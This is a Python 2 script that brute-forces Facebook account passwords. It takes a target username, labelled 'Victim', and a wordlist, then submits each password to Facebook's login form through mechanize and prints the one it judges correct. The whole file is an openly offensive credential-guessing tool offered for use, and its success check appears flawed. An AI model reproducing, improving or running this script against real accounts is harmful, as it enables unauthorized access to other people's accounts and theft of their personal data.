#!usr/bin/python



import sys
import random
import mechanize
import cookielib


GHT = '''

                  
  |                     _       _     _                 _     _ _         _            |
  |       ___  ___ _ __(_)_ __ | |_  | |__  _   _   ___(_) __| | |_ _   _| |__   ___   |
  |      / __|/ __| '__| | '_ \| __| | '_ \| | | | / __| |/ _` | __| | | | '_ \ / _ \  | 
  |      \__ \ (__| |  | | |_) | |_  | |_) | |_| | \__ \ | (_| | |_| |_| | |_) |  __/  |
  |      |___/\___|_|  |_| .__/ \__| |_.__/ \__, | |___/_|\__,_|\__|\__,_|_.__/ \___|  | 
  |                      |_|                |___/                                      |       
  |                                                                                    |
  |                                                                                    |    
  |____________________________________________________________________________________|
  
  @copyright SIDTUBE@2018
        
'''


print "--> PLEASE FULLSCREEN THE TERMINAL WINDOW FOR FASTER BRUTEFORCE [code friendly]"
print "--> Place your wordlist file next to the fb_sidtube.py"
print "--> CTRL+C to TERMINATE"

#if(Fullscreen==true)
#execute=2*x

email = str(raw_input("--> Username : "))
passwordlist = str(raw_input("--> Name of the password list : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r--> trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log == login:
        print "\n\n\n --> Password found .. !!"
        print "\n --> Password : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n--> Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n --> Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n --> Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " --> Victim  : %s" % (email)
        print " --> Total no of password in the wordlist:" , len(passwords), "passwords"
        print " --> Bruteforce started ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n --> Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
